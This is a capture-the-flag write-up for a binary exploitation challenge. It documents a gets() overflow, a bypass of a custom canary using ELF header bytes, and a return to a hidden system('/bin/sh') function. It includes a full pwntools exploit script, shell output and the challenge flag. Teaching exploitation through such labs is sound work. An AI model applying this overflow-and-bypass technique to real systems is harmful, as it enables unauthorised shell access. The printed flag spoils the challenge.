# Gatekeeper

**Challenge Name:** Gatekeeper  
**Category:** Binary Exploitation (Pwn)  
**Difficulty:** Medium  
**Connection:** `nc gatekeep.rtaccess.app 9999`  
**Flag:** `root{i_w4n+_t0_br34k_fr33}`

---

## Challenge Description

> Can you poison the gatekeeper's logs to gain access to his shell? Or is his defence just too strong. Well, I have brought you the logs; now it is upto you to poison it.

We are given a binary and a remote service. The goal is to exploit the logging mechanism to gain shell access and retrieve the flag.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nc` (netcat) | Connecting to the remote service |
| `file` | Identifying binary type |
| `strings` | Extracting readable strings from binary |
| `objdump` | Disassembling the binary |
| `readelf` | Analyzing ELF headers and sections |
| `xxd` | Hexdump for inspecting specific bytes |
| `pwntools` (Python) | Crafting and sending exploit payloads |

---

## Methodology

### Step 1: Initial Reconnaissance

First, I connected to the service to understand what we're dealing with:

```bash
$ nc gatekeep.rtaccess.app 9999
=== Gatekeeper Log v1.0 ===
Enter log entry:
```

The service prompts for a log entry. I also downloaded the provided binary for local analysis.

---

### Step 2: Binary Analysis

I started by identifying the binary type:

```bash
$ file challenge
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

**Key observations:**
- 64-bit ELF executable
- Dynamically linked
- **Not stripped** (symbols available for easier analysis)

Next, I checked for security protections:

```bash
$ readelf -h challenge | grep Type
  Type:                              EXEC (Executable file)
```

The binary is of type `EXEC`, meaning **No PIE** (Position Independent Executable). Addresses are fixed, making exploitation easier.

---

### Step 3: Extracting Interesting Strings

```bash
$ strings challenge | head -n 25
/lib64/ld-linux-x86-64.so.2
malloc
__libc_start_main
gets            # <-- Vulnerable function!
srand
strncmp
puts
system          # <-- Target for shell execution!
exit
printf
...
```

**Critical findings:**
- `gets` - Known vulnerable function (no bounds checking)
- `system` - Can be used to spawn a shell

I also searched for `/bin/sh`:

```bash
$ strings challenge | grep "/bin/sh"
/bin/sh
```

The string `/bin/sh` exists in the binary. This is promising!

---

### Step 4: Disassembly Analysis

I disassembled the binary to understand the control flow:

```bash
$ objdump -d challenge > dump.txt
```

#### Main Function

```asm
00000000004013a5 <main>:
  ...
  4013fd:  call   4012d0 <log_entry>
  ...
```

Main calls `log_entry`, which is where the interesting logic happens.

#### log_entry Function (The Vulnerable Function)

```asm
00000000004012d0 <log_entry>:
  4012d0:  push   %rbp
  4012d5:  mov    %rsp,%rbp
  4012d8:  sub    $0x50,%rsp          # Buffer size: 0x50 (80 bytes)
  ...
  4012e1:  call   401160 <time@plt>   # Get current time
  4012e8:  call   401150 <srand@plt>  # Seed random with time
  4012ed:  call   4011c0 <rand@plt>   # Generate "canary"
  4012f2:  mov    %eax,-0x10(%rbp)    # Store canary at -0x10
  ...
  4012fa:  call   401180 <malloc@plt> # Allocate 4 bytes on heap
  4012ff:  mov    %rax,-0x8(%rbp)     # Store pointer at -0x8
  40130a:  mov    %edx,(%rax)         # Copy canary to heap
  ...
  40133b:  call   401170 <gets@plt>   # VULNERABLE! Buffer overflow here
  ...
  401340:  mov    -0x8(%rbp),%rax     # Load heap pointer
  401344:  mov    (%rax),%edx         # Load value from heap
  401346:  mov    -0x10(%rbp),%eax    # Load value from stack
  401349:  cmp    %eax,%edx           # Compare stack vs heap
  40134b:  je     401357              # Pass check if equal
  40134d:  mov    $0x0,%edi
  401352:  call   4011b0 <exit@plt>   # Exit if mismatch!
  ...
  401397:  call   401110 <strncmp@plt># Compare with "exit"
  40139e:  je     4013a2              # If "exit", return
  4013a0:  jmp    40132f              # Otherwise, loop back to gets
```

**Key Observations:**

1. **Custom Stack Canary**: The function uses `rand()` seeded with `time(0)` to create a pseudo-canary stored both on the stack (`-0x10(%rbp)`) and heap.

2. **Buffer Overflow**: The `gets()` call reads into a buffer at `-0x50(%rbp)` with no size limit.

3. **Canary Check**: Before returning, it compares the stack value with the heap value. If they differ, it exits.

4. **Loop Condition**: The function loops back to `gets` unless the input starts with "exit".

#### Hidden Function: administrative_shell

I found a hidden function not called from main:

```asm
00000000004012b6 <administrative_shell>:
  4012b6:  push   %rbp
  4012bb:  mov    %rsp,%rbp
  4012be:  lea    0xd43(%rip),%rax     # Load "/bin/sh" address
  4012c8:  call   401130 <system@plt>  # system("/bin/sh")
  4012ce:  pop    %rbp
  4012cf:  ret
```

This function calls `system("/bin/sh")`! If I can redirect execution here, I get a shell.

I verified the string at the referenced address:

```bash
$ xxd -s 0x2008 -l 10 challenge
00002008: 2f62 696e 2f73 6800 456e  /bin/sh.En
```

Confirmed: `/bin/sh` is at offset `0x2008` → virtual address `0x402008`.

---

### Step 5: Exploit Development

#### Understanding the Stack Layout

```
-0x50: Buffer start (gets input)
-0x10: Custom canary (4 bytes)
-0x0C: Padding (4 bytes)
-0x08: Heap pointer (8 bytes)
 0x00: Saved RBP (8 bytes)
+0x08: Return Address (8 bytes)
```

#### Bypassing the Canary Check

The canary check compares:
- Stack value at `-0x10(%rbp)` (our overwritten canary)
- Heap value at `*(-0x08(%rbp))` (dereferenced pointer)

**My Bypass Strategy:**

Since I control BOTH the stack canary AND the pointer, I can:
1. Set the pointer to a **known static address** (e.g., `0x400000` - ELF header)
2. Set my fake canary to match the value at that address

The ELF header starts with the magic bytes `\x7fELF` = `0x464c457f` (little-endian).

So:
- **Fake Pointer**: `0x400000`
- **Fake Canary**: `0x464c457f`

When the check runs:
- Stack canary: `0x464c457f`
- Heap value: `*(0x400000)` = `0x464c457f`
- They match! Check passes!

#### Breaking the Loop

The function only returns if input starts with "exit". So I prefix my payload with "exit".

#### Finding a RET Gadget

For stack alignment (required by `system` in modern glibc), I need a `ret` gadget:

```bash
$ objdump -d challenge | grep "ret"
  40101a:  c3    ret
```

RET gadget at `0x40101a`.

---

### Step 6: Final Exploit Script

I created the following Python exploit using `pwntools`:

```python
from pwn import *

def solve():
    # Connect to remote
    p = remote("gatekeep.rtaccess.app", 9999)
    
    # Target addresses
    admin_shell = 0x4012b6      # administrative_shell function
    ret_gadget = 0x40101a       # ret instruction for alignment
    
    # Canary bypass values
    fake_pointer = 0x400000     # Points to ELF header
    fake_canary = 0x464c457f    # Value at 0x400000 ("\x7fELF")
    
    # Build payload
    payload = b"exit"           # Required to break the loop
    payload += b"A" * 60        # Padding to reach canary (64 - 4)
    payload += p32(fake_canary) # Fake canary at -0x10
    payload += b"B" * 4         # Padding
    payload += p64(fake_pointer)# Pointer at -0x08
    payload += b"C" * 8         # Overwrite saved RBP
    payload += p64(ret_gadget)  # Stack alignment
    payload += p64(admin_shell) # Return to administrative_shell
    
    # Send payload
    p.sendline(payload)
    
    # Interact with shell
    p.interactive()

if __name__ == "__main__":
    solve()
```

---

### Step 7: Exploitation

Running the exploit:

```bash
$ source venv/bin/activate
$ python3 solve.py
[+] Opening connection to gatekeep.rtaccess.app on port 9999: Done
[*] Switching to interactive mode
=== Gatekeeper Log v1.0 ===
Enter log entry:
[+] Entry logged successfully.
exitAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAELFBBBB...
$ 
```

I got a shell! Now to find the flag:

```bash
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)

$ ls -la /home/ctf
total 284
drwxr-x--- 1 root ctf    4096 Feb  7 11:51 .
-rwxr-x--- 1 root ctf   16640 Feb  7 11:51 challenge
-rwxr----- 1 root ctf      27 Feb  7 11:46 flag
...

$ cat /home/ctf/flag
root{i_w4n+_t0_br34k_fr33}
```

---

## Summary

| Step | Action |
|------|--------|
| 1 | Identified `gets` buffer overflow vulnerability |
| 2 | Discovered custom canary mechanism using `rand()` |
| 3 | Found hidden `administrative_shell` function calling `system("/bin/sh")` |
| 4 | Bypassed canary by pointing to predictable ELF header bytes |
| 5 | Prefixed payload with "exit" to break input loop |
| 6 | Used RET gadget for stack alignment |
| 7 | Redirected execution to `administrative_shell` |
| 8 | Got shell and read flag |

---

## Flag

```
root{i_w4n+_t0_br34k_fr33}
```

---

## Key Takeaways

1. **Never trust `gets()`** - It has no bounds checking and leads to buffer overflows.

2. **Custom security mechanisms can be bypassed** - The "canary" wasn't truly random from our perspective since we controlled the pointer.

3. **Hidden functions are attack targets** - Always look for unreferenced code that could be useful.

4. **Understanding stack layout is crucial** - Knowing exactly where values are stored enables precise overwrites.

5. **Loop conditions matter** - The "exit" prefix was necessary to trigger the return and execute our ROP chain.
